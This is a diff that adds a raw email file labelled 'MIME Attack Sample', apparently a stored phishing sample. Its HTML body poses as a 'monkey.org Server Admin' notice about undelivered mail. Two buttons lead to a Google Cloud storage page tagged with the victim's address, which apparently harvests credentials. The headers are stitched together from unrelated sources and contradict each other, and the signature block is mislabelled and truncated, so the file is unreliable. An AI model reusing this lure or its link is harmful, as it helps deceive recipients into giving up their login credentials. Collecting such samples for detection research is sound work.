@@ -1,0 +1,179 @@
+From
+: "Bill Soto" <back_52@yahoo.com>
+Sender: vweir@firstunion1.com
+To: elizabeth.sager@enron.com, credit <.williams@enron.com>
+Subject: MIME Attack Sample
+Content-Type: multipart/signed; protocol="application/x-pkcs7-signature";  micalg=sha-256; boundary="BOUNDARY" 
+--BOUNDARY
+Content-Type: text/plain Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=4.33
+Authentication-Results: imf20.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf20.b.hostedemail.com: domain of sales@hident-dental.com designates 167.86.78.33 as permitted sender) smtp.mailfrom=sales@hident-dental.com;
+	dmarc=pass (policy=none) header.from=hident-dental.com
+X-Stat-Signature: yh5xup31xq778eg9z7eizb9sf3dpzg7h
+X-Rspamd-Queue-Id: ED7D9800C021
+X-Rspamd-Server: rspam09
+X-HE-Tag: 1629584969-882792
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 64
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
+color: rgb(51, 51, 51); font-family: Roboto,Tahoma,Helvetica,sans-serif; fo=
+nt-size: 13px;">
+<tbody>
+<tr>
+<th style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 2px; color: rgb(0, 0, 0); background-color: rgb(2, 151, 64);">&n=
+bsp;</th>
+
+<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 665px; color: rgb(0, 0, 0); font-family: Roboto,Tahoma,Helvetica=
+,sans-serif; background-color: rgb(243, 255, 248);"><span style=3D"font-siz=
+e: 12px;">From monkey.org Server Admin<br></span></td></tr></tbody></table>=
+
+
+<div style=3D"width: 700px; color: rgb(0, 0, 0); font-family: Roboto,Tahoma=
+,Helvetica,sans-serif; font-size: 12px;"><br><br>You have six messages stil=
+l pending to be delivered to your inbox since Friday, August 20th, 2021. <b=
+r><br><b>Mailbox: <a style=3D"color: rgb(17, 85, 204);" href=3D"#NOP">jose@=
+monkey.org</a></b><br><br><br></div>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-=
+space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
+ font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
+roke-width: 0px; text-decoration-style: initial; text-decoration-color: ini=
+tial;" dir=3D"ltr">
+<table style=3D"width: 700px; height: 208px; color: rgb(0, 0, 0); font-size=
+: 15px;" border=3D"0" cellspacing=3D"2" cellpadding=3D"2">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(243, 255, 248);"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Subject</strong></td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(243, 255, 248);"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Recipient</strong></=
+td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(243, 255, 248);"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Date</strong></td></tr>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; FW: Invoice copy AWB =
+No. 325-2322 </td>
+
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;20/08/2021</td></tr=
+>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; Updated Sea Freight Q=
+uotation</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;20/08/2021</td></tr=
+>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; AW: PO#203477 INVOICE=
+S</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19/08/2021</td></tr=
+>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; Re: &#20851;&#20110;&=
+#21551;&#21160;&#21496;&#32534;&#21046;20/08/2021&#35745;&#21010;</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;17/08/2021</td></tr=
+>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; Fwd: Payment ---- For=
+warded message ----</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 150px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;16/08/2021</td></tr=
+>
+<tr>
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; COVID-19 Safety Measu=
+res</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To: <a style=3D"color: rg=
+b(17, 85, 204);" href=3D"#NOP">jose@monkey.org</a></td>
+<td style=3D"margin: 0px; width: 160px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;16/08/2021</s=
+pan></td></tr></tbody></table>
+<div style=3D"margin: 0px;">&nbsp;</div>
+<ol style=3D"padding: 30px;">
+<li><a style=3D"background: rgb(80, 110, 216); padding: 10px; border-radius=
+: 2px; color: rgb(255, 255, 255); text-decoration: none;" href=3D"https://s=
+torage.cloud.google.com/staging.maintainancecomponeta.appspot.com/fcocnew.h=
+tml#jose@monkey.org" target=3D"_blank" rel=3D"">Release Pending Mails to in=
+box</a> <br><br><br>
+<li><a style=3D"background: rgb(212, 0, 0); padding: 10px; border-radius: 2=
+px; color: rgb(255, 255, 255); text-decoration: none;" href=3D"https://stor=
+age.cloud.google.com/staging.maintainancecomponeta.appspot.com/fcocnew.html=
+#jose@monkey.org" target=3D"_blank" rel=3D"">Report Error To IT Help Desk</=
+a> </li></ol>
+<div style=3D"margin: 0px; font-family: arial, helvetica, sans-serif;"><br>=
+<br>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; font-variant-ligatures: normal; font-variant-caps: normal; =
+text-decoration-style: initial; text-decoration-color: initial;" dir=3D"ltr=
+"><span style=3D"color: rgb(0, 0, 0); font-family: Calibri; font-size: 14px=
+;">
+You will receive pending emails after successful login via portal as we apo=
+logize for the inconvenience.</span></div></div>
+<div style=3D"width: 700px; margin-top: 30px;">
+<hr>
+</div>
+<div style=3D"color: rgb(131, 130, 130); line-height: 2; font-size: 78%; ma=
+rgin-top: 10px;"><em>Message Encrypted by monkey.org</em>&nbsp;<em>&copy; A=
+ll Rights Reserved.</em> | If you do not wish to recieve this message <a hr=
+ef=3D"mailto: unsubscribe@monkey.org?subject=3DUnsubscribe&amp;body=3DKindl=
+y Unsubscribe From this newsletter" target=3D"_blank" rel=3D"">Unsubscribe.=
+</a> </div></div></body></html>
+--BOUNDARY
+Content-Type: application/x-pkcs7-signature; name="smime.p7s"
+Content-Disposition: attachment; filename="smime.p7s"
+Content-Transfer-Encoding: base64 
+
+-----BEGIN PGP SIGNATURE-----
+MIAGCSqGSIb3DQEHAqCAMIACAQExDzANBglghkgBZQMEAgEFADCABgkqhkiG9w0BBwEAAKCCDqMw
+ggSXMIIDf6ADAgECAg5IG2oIokSI01ybPclIDTANBgkqhkiG9w0BAQsFADBMMSAwHgYDVQQLExdH
+bG9iYWxTaWduIFJvb3QgQ0EgLSBSMzETMBEGA1UEChMKR2xvYmFsU2lnbjETMBEGA1UEAxMKR2xv
+YmFsU2lnbjAeFw0xNjA2MTUwMDAwMDBaFw0yNDA2MTUwMDAwMDBaMF0xCzAJBgNVBAYTAkJFMRkw
+FwYDVQQKExBHbG9iYWxTaWduIG52LXNhMTMwMQYDVQQDEypHbG9iYWxTaWduIFBlcnNvbmFsU2ln
+biAxIENBIC0gU0hBMjU2IC0gRzMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDKsJtr
+TQo4rIa7CH2H78wBxmZlQX07EYoDnoAAMdoMTTysHRYRuCbonhe8k/c4ZDtyAd1Um7pcxmRF3oRx
+--BOUNDARY--
